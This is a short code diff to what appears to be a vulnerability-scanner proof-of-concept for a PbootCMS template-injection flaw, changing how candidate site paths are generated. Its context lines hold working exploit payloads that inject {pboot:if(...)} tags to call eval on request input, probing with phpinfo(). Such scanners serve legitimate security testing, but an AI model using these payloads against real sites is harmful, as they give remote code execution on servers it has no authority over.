@@ -27,15 +27,8 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, '../PbootCMS/'),
-                self.url_normpath(self.url, 'PbootCMS/'),
-                self.url_normpath(self.url, '../PbootCMS/'),
-            ]))
-
             async with ClientSession() as session:
-                for path in path_list:
+                for path in  self.url_normpath(self.url, ['./PbootCMS/', './']):
                     for poc in [
                         "index.php/index/index?keyword={pboot:if(eval($_REQUEST[1]));//)})}}{/pboot:if}&1=phpinfo();"
                         "index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
